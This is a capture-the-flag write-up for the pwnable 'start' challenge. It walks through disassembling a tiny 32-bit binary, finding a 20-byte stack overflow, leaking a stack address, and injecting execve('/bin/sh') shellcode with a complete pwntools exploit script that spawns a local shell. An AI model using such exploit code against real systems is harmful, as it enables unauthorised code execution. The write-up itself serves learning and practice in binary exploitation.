---
title: "Start"
date: "2025-10-14"
tags: ["pwnable", "shellcode", "ret2shellcode"]
---

In this challenge they give us a binary with the following characteristics and protections:

```c
file start                                                                                                                  
start: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), statically linked, not stripped
```

```c
pwndbg> checksec
Arch:     i386
RELRO:      No RELRO
Stack:      No canary found
NX:         NX disabled
PIE:        No PIE (0x8048000)
Stripped:   No
```

It looks very basic. Let's look at its functions with radare2:

```c
afl
0x08048060    1     61 entry0
```

As we can see, it only has one function. Let's see what it holds:

```nasm
[0x08048060]> pdf @ entry0 
            ;-- section..text:
            ;-- _start:
            ;-- eip:
┌ 61: entry0 ();
│           0x08048060      54             push esp                    ; [01] -r-x section size 67 named .text
│           0x08048061      689d800408     push loc._exit              ; 0x804809d ; "\1\xc0@\u0340" ; int status
│           0x08048066      31c0           xor eax, eax
│           0x08048068      31db           xor ebx, ebx
│           0x0804806a      31c9           xor ecx, ecx
│           0x0804806c      31d2           xor edx, edx
│           0x0804806e      684354463a     push 0x3a465443             ; 'CTF:'
│           0x08048073      6874686520     push 0x20656874             ; 'the '
│           0x08048078      6861727420     push 0x20747261             ; 'art '
│           0x0804807d      6873207374     push 0x74732073             ; 's st'
│           0x08048082      684c657427     push 0x2774654c             ; 'Let\''
│           0x08048087      89e1           mov ecx, esp
│           0x08048089      b214           mov dl, 0x14                ; 20
│           0x0804808b      b301           mov bl, 1
│           0x0804808d      b004           mov al, 4
│           0x0804808f      cd80           int 0x80
│           0x08048091      31db           xor ebx, ebx
│           0x08048093      b23c           mov dl, 0x3c                ; '<' ; 60
│           0x08048095      b003           mov al, 3
│           0x08048097      cd80           int 0x80
│           0x08048099      83c414         add esp, 0x14
└           0x0804809c      c3             ret
```

The program does the following:

* Pushes `ESP`.
* Pushes the address of the `exit` function.
* Clears the registers.
* Pushes the string "`Let's Start the CTF`".
* Sets up and runs a `write()`.
* Sets up and runs a `read()`.
* Adds 20 bytes to ESP.

What can we do with this? This program has a buffer overflow, because the `read` reads 60 bytes but the offset to the return address is smaller. We can check that with `pwndbg` and `cyclic` to find the offset:

```
pwndbg> cyclic
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
pwndbg> r
Let's start the CTF:aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

EIP  0x61616166 ('faaa') # Miramos el registro EIP
 
pwndbg> cyclic -l faaa
Found at offset 20 # Efectivamente, 20 bytes. Con lo cual hay overflow
```

Since we can control EIP, we have control of the program flow, so we can jump wherever we want. In this case the program is very simple and there are not enough gadgets for a ROP. As the stack is executable (at the start we saw that NX is disabled), we can try to drop in some shellcode and run it. For that I need a stack leak so I can work out the address where my shellcode starts. How do I get that leak?

If we go back over the code, we can remember that at the end of the program this happens:

```nasm
0x08048099      83c414         add esp, 0x14
```

By moving ESP, if we could call `write` again it would print values from ESP once more. And since the value is now higher, it could end up printing the `push esp` done at the start of the program. Let's try it:

```python
def main():
    io = conn()

	padding = b"a" * 20
    payload = padding + p32(0x08048087)
    
    io.recvuntil(b"Let's start the CTF:")
    io.send(payload)

    eip = u32(io.recv(4))
    print(f"Dirección ESP: {hex(eip)}")

    io.interactive()
```

```c
python3 solve.py LOCAL                                                                                                                                   3.13.7  19:13 
[*] '/home/ub1cu0/Escritorio/PWN/pwnable/start/start'
    Arch:       i386-32-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX disabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
[+] Starting local process '/home/ub1cu0/Escritorio/PWN/pwnable/start/start': pid 55204
Longitud: 44
Dirección ESP: 0xffa1dfd0
[*] Switching to interactive mode
\x01\x00\x00\x00\xa3\xfe\xa1\xff\x00\x00\x00\x00\xd3\xfe\xa1\xff$  
```

We have the address! Now I have to inject shellcode and send the flow there. Since we sent our payload to the `write`, there is a `read` right after it, so that is where we can write the shellcode:

```python
shellcode = asm('\n'.join([
    'push %d' % u32('/sh\0'),
    'push %d' % u32('/bin'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0xb',
    'int 0x80',
]))
print(f"Longitud: {len(shellcode)}")
```

The full script looks like this:

```python
#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("./start")

context.binary = exe
context.terminal = ['kitty']
gdb_script = '''
b _start
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
        return r
    return remote("addr", 1337)

def main():
    io = conn()

    shellcode = asm('\n'.join([
        'push %d' % u32('/sh\0'),
        'push %d' % u32('/bin'),
        'xor edx, edx',
        'xor ecx, ecx',
        'mov ebx, esp',
        'mov eax, 0xb',
        'int 0x80',
    ]))
    
    print(f"Longitud: {len(shellcode)}")

    padding = b"a" * 20

    payload = padding + p32(0x08048087)
    
    io.recvuntil(b"Let's start the CTF:")
    io.send(payload)

    eip = u32(io.recv(4))
    print(f"Dirección ESP: {hex(eip)}")

    payload = padding + p32(eip+0x14) + shellcode # Para conseguir el offset vale con debuggear un poco dinámicamente para que cuadre bien con nuestro shellcode

    io.send(payload)
    
    io.interactive()

if __name__ == "__main__":
    main()
```

```c
PWN/pwnable/start ❯ python3 solve.py LOCAL                                       
[*] '/home/ub1cu0/Escritorio/PWN/pwnable/start/start'
    Arch:       i386-32-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX disabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
[+] Starting local process '/home/ub1cu0/Escritorio/PWN/pwnable/start/start': pid 64626
/usr/lib/python3.13/site-packages/pwnlib/context/__init__.py:1709: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  return function(*a, **kw)
Longitud: 23
Dirección ESP: 0xfffc8a90
[*] Switching to interactive mode
\x01\x00\x00\x00\xa3\x8e\xfc\xff\x00\x00\x00\x00ӎ\xfc\xff$ whoami
ub1cu0
$  
```

It works!
